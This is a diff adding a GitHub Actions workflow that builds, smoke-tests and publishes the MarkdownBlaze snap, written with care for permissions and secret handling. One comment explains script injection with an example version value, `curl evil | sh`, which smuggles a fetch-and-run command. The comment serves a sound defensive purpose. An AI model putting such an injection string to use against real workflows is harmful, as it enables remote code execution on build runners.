@@ -1,0 +1,240 @@
+name: snap
+
+# Builds the snap (one per architecture, each on a runner of its own kind), smoke-tests it, and, when
+# asked to, publishes it to the Snap Store's stable channel.
+#
+# It is a workflow of its own, not a job of release.yml, so that the snap can be tried in CI without a
+# release: a release run always creates a GitHub release. Started by hand it only builds and tests; the
+# release workflow calls it, and is the only way to publish.
+on:
+  workflow_call:
+    inputs:
+      version:
+        description: "Version of the snap (X.Y.Z or X.Y.Z-prerelease)"
+        type: string
+        required: true
+      publish:
+        description: "Upload to the Snap Store and release to the stable channel (needs SNAPCRAFT_STORE_CREDENTIALS)"
+        type: boolean
+        default: false
+    secrets:
+      # Optional, so that a caller that does not publish does not have to have the secret.
+      SNAPCRAFT_STORE_CREDENTIALS:
+        required: false
+  workflow_dispatch:
+    inputs:
+      version:
+        description: "Version of the snap (leave empty for 0.0.<run_number>-dev)"
+        required: false
+        default: ""
+    # No publish option on purpose: a manual run only builds and tests.
+
+# Nothing is allowed by default; the build job asks for the one thing it uses.
+permissions: {}
+
+env:
+  PROJECT: src/MarkdownBlaze/MarkdownBlaze.csproj
+
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+    permissions: {}
+    outputs:
+      version: ${{ steps.v.outputs.version }}
+    steps:
+      - id: v
+        # The input reaches the script through the environment, never through ${{ }} in the script
+        # text: an expression is pasted into the script before the shell parses it, so a version such
+        # as `1"; curl evil | sh; "` would be code. As an environment variable it is only data, and it
+        # is checked against a version-shaped pattern before anything else uses it. (The same check as
+        # the setup job of release.yml, and build-snap.sh makes it once more.)
+        env:
+          VERSION_INPUT: ${{ inputs.version }}
+          RUN_NUMBER: ${{ github.run_number }}
+        run: |
+          set -euo pipefail
+          if [ -n "$VERSION_INPUT" ]; then v="$VERSION_INPUT"; else v="0.0.$RUN_NUMBER-dev"; fi
+          if ! printf '%s' "$v" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$'; then
+            echo "::error::'$v' is not a version (expected e.g. 1.2.3 or 1.2.3-rc.1)"
+            exit 1
+          fi
+          echo "version=$v" >> "$GITHUB_OUTPUT"
+          echo "Snap version: $v"
+
+  snap:
+    needs: setup
+    name: snap (${{ matrix.arch }})
+    runs-on: ${{ matrix.runner }}
+    timeout-minutes: 45
+    permissions:
+      contents: read
+    strategy:
+      matrix:
+        include:
+          # Each architecture is built on a runner of its own kind, so that snapcraft builds for the
+          # architecture the self-contained publish output is for.
+          - arch: amd64
+            runner: ubuntu-24.04
+            rid: linux-x64
+          - arch: arm64
+            runner: ubuntu-24.04-arm
+            rid: linux-arm64
+    env:
+      VERSION: ${{ needs.setup.outputs.version }}
+      RID: ${{ matrix.rid }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6.0.0
+        with:
+          dotnet-version: '10.0.x'
+
+      # The snap repackages the self-contained publish output, so there is nothing to build inside it.
+      - name: Publish and stage the snap build directory
+        id: stage
+        run: |
+          set -euo pipefail
+          dotnet publish "$PROJECT" -c Release -r "$RID" --self-contained true -p:Version="$VERSION" -o "$RUNNER_TEMP/publish"
+          # build-snap.sh prints the directory it staged as the last line of stdout (the rest is on stderr).
+          dir="$(bash packaging/snap/build-snap.sh "$VERSION" "$RUNNER_TEMP/publish" "$RUNNER_TEMP/snap-stage" | tail -n 1)"
+          echo "dir=$dir" >> "$GITHUB_OUTPUT"
+
+      - name: Build the snap
+        id: build
+        uses: snapcore/action-build@3bdaa03e1ba6bf59a65f84a751d943d549a54e79 # v1.3.0
+        with:
+          path: ${{ steps.stage.outputs.dir }}
+
+      # What this proves and what it does not. It proves that the snap installs, that the content
+      # snaps it needs (GTK and WebKitGTK from gnome-46-2404, the graphics stack and ICU from
+      # mesa-2404) can be connected, that the app starts under confinement and does not crash, and
+      # that the page inside the window loaded and ran the app's own code: the app only opens the
+      # document it was given after the web view has loaded the Blazor page, so a log line saying that
+      # the document was rendered cannot appear without it. It also proves that the `home` plug lets
+      # the app read the document. It does NOT prove that anything is visible: the screen is a virtual
+      # one that nobody looks at, so a blank window, wrong colours or a broken layout pass this test.
+      # Those are checked by hand on a real desktop before the first release to the store.
+      - name: Smoke test (install and launch under a virtual display)
+        env:
+          SNAP_FILE: ${{ steps.build.outputs.snap }}
+        run: |
+          set -uo pipefail
+
+          report() {
+            echo "::group::snap connections markdownblaze"
+            snap connections markdownblaze || true
+            echo "::endgroup::"
+            echo "::group::app output"
+            cat "$RUNNER_TEMP/app.out" 2>/dev/null || true
+            echo "::endgroup::"
+            echo "::group::application log"
+            find "$HOME/snap/markdownblaze" -name 'markdownblaze*.log' -print -exec cat {} + 2>/dev/null || true
+            echo "::endgroup::"
+          }
+          fail() {
+            echo "::error::Smoke test failed: $*"
+            report
+            exit 1
+          }
+
+          command -v xvfb-run >/dev/null || { sudo apt-get update -q && sudo apt-get install -y -q --no-install-recommends xvfb; } || fail "could not install xvfb"
+
+          # --dangerous because the snap is not from the store. snapd normally installs the default
+          # providers of the content snaps by itself, but a local install is not certain to, so say it.
+          sudo snap install --dangerous "$SNAP_FILE" || fail "snap install failed"
+          for content in gnome-46-2404 mesa-2404; do
+            snap list "$content" >/dev/null 2>&1 || sudo snap install "$content" || fail "could not install $content"
+          done
+
+          # Connect what is not connected yet. `snap connections` shows an unconnected plug with "-" as its slot.
+          connected() { snap connections markdownblaze | awk -v p="markdownblaze:$1" '$2 == p && $3 != "-" { found = 1 } END { exit !found }'; }
+          connect() { # connect <plug> [<slot>]
+            connected "$1" || sudo snap connect "markdownblaze:$1" ${2:+"$2"} || fail "could not connect $1"
+          }
+          connect gnome-46-2404 gnome-46-2404:gnome-46-2404
+          connect gpu-2404 mesa-2404:gpu-2404
+          for plug in desktop x11 home; do connect "$plug"; done
+          for plug in gnome-46-2404 gpu-2404 desktop x11 home; do
+            connected "$plug" || fail "plug $plug is not connected"
+          done
+
+          # -ac: no X authority, because the snap cannot read the file xvfb-run makes under /tmp.
+          # --log-level debug makes the app log the document it renders. The document is in the
+          # repository checkout, which is under the runner's home, so it is also a check of the home plug.
+          doc="$GITHUB_WORKSPACE/samples/wiki/index.md"
+          timeout 180 xvfb-run -a -s "-ac -screen 0 1280x800x24" markdownblaze --log-level debug "$doc" > "$RUNNER_TEMP/app.out" 2>&1 &
+          pid=$!
+
+          log() { find "$HOME/snap/markdownblaze" -name 'markdownblaze.log' -print -quit 2>/dev/null; }
+          started() { f="$(log)"; [ -n "$f" ] && grep -Eq 'MarkdownBlaze .* started on' "$f"; }
+          rendered() { f="$(log)"; [ -n "$f" ] && grep -Eq 'Rendered index\.md in [0-9]+ ms' "$f"; }
+
+          # The first start on a runner is slow (cold caches, the web view's helper processes), so wait
+          # for the document, up to 90 s, rather than for a fixed time.
+          for _ in $(seq 1 90); do
+            kill -0 "$pid" 2>/dev/null || break
+            rendered && break
+            sleep 1
+          done
+          kill -0 "$pid" 2>/dev/null || fail "the app exited before it showed the document"
+          started || fail "the app's log has no start-up line"
+          rendered || fail "the app was still running after 90 s but never rendered the document"
+
+          # Then it has to stay up: a crash that comes just after the first render is still a crash.
+          sleep 20
+          kill -0 "$pid" 2>/dev/null || fail "the app exited within 20 s of showing the document"
+
+          echo "The app started, rendered the document and was still running 20 s later."
+          pkill -f '/snap/markdownblaze/' || true
+          kill "$pid" 2>/dev/null || true
+          wait "$pid" 2>/dev/null || true
+
+      # Kept for a week so that the build can be installed by hand (`snap install --dangerous`) and
+      # tried on a real desktop. It is not attached to the GitHub release: a snap from outside the
+      # store gets no updates, and the store is where users are meant to get it.
+      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
+        with:
+          name: snap-${{ matrix.arch }}
+          path: ${{ steps.build.outputs.snap }}
+          if-no-files-found: error
+          retention-days: 7
+
+  # Publishing is a job of its own that waits for every architecture: if one of them fails its smoke
+  # test, none is published, so stable never holds a new revision for one architecture and the old one
+  # for the other. It only downloads the snaps the build job tested; nothing is rebuilt here.
+  publish:
+    needs: snap
+    if: ${{ inputs.publish }}
+    runs-on: ubuntu-latest
+    permissions: {}
+    strategy:
+      matrix:
+        arch: [amd64, arm64]
+    steps:
+      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
+        with:
+          name: snap-${{ matrix.arch }}
+          path: snap
+
+      - name: Find the snap
+        id: file
+        run: |
+          set -euo pipefail
+          f="$(find snap -name '*.snap' -print -quit)"
+          [ -n "$f" ] || { echo "::error::No .snap in the snap-$ARCH artifact"; exit 1; }
+          echo "path=$f" >> "$GITHUB_OUTPUT"
+        env:
+          ARCH: ${{ matrix.arch }}
+
+      # The credentials are given to this one step, through the environment (which snapcraft reads
+      # itself), so that no other step, and no action that runs before it, can see them. It uploads and
+      # releases to stable in one go: the snap reaches Ubuntu App Center users as soon as the store's
+      # automatic review has passed it.
+      - name: Upload to the Snap Store and release to stable
+        uses: snapcore/action-publish@214b86e5ca036ead1668c79afb81e550e6c54d40 # v1.2.0
+        env:
+          SNAPCRAFT_STORE_CREDENTIALS: ${{ secrets.SNAPCRAFT_STORE_CREDENTIALS }}
+        with:
+          snap: ${{ steps.file.outputs.path }}
+          release: stable
